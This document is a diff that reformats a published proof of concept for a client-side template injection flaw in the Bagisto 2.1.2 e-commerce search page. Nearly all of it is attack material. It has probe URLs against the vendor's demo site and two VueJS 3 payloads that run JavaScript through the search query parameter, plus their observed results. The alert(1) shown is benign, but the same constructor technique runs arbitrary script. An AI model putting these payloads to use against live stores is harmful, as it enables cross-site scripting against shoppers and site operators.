@@ -1,26 +1,36 @@
-# Exploit Title: Bagisto 2.1.2 Client-Side Template Injection(CSTI)
-# Date: 06/18/2024
-# Exploit Author: tmrswrr
-# Vendor Homepage: https://forums.bagisto.com/
-# Version: 2.1.2
-# Tested on: https://demo.bagisto.com/
+# Exploit Title: Bagisto 2.1.2 Client-Side Template Injection (CSTI)
+**Date**: 06/18/2024  
+**Exploit Author**: tmrswrr  
+**Vendor Homepage**: [Bagisto Forums](https://forums.bagisto.com/)  
+**Version**: 2.1.2  
+**Tested on**: [Bagisto Demo](https://demo.bagisto.com/)
 
+## Proof of Concept (PoC)
 
-https://demo.bagisto.com/bagisto-common/search?query={{7*7}}
+1. Navigate to the search functionality on Bagisto:
 
-49
+    ```
+    https://demo.bagisto.com/bagisto-common/search?query={{7*7}}
+    ```
+    **Result**: 49
 
-https://demo.bagisto.com/bagisto-common/search?query={{'a'.toUpperCase()}}
+    ```
+    https://demo.bagisto.com/bagisto-common/search?query={{'a'.toUpperCase()}}
+    ```
+    **Result**: A
 
-A
+    ```
+    https://demo.bagisto.com/bagisto/search?query={{ Object.keys(this) }}
+    ```
+    **Result**: [ "_", "onSubmit", "onInvalidSubmit", "lazyImages", "animateBoxes" ]
 
-https://demo.bagisto.com/bagisto/search?query={{ Object.keys(this) }}
+2. Payloads for VueJS 3:
 
-[ "_", "onSubmit", "onInvalidSubmit", "lazyImages", "animateBoxes" ]
+    ```
+    https://demo.bagisto.com/bagisto/search?query={{_openBlock.constructor('alert(1)')()}}
+    ```
+    ```
+    https://demo.bagisto.com/bagisto/search?query={{-function(){this.alert(1)}()}}
+    ```
 
-> Payloads for VueJS 3
-
-https://demo.bagisto.com/bagisto/search?query={{_openBlock.constructor('alert(1)')()}}
-https://demo.bagisto.com/bagisto/search?query={{-function(){this.alert(1)}()}}
-
-> You will be see alert button
+    **Result**: You will see an alert box.
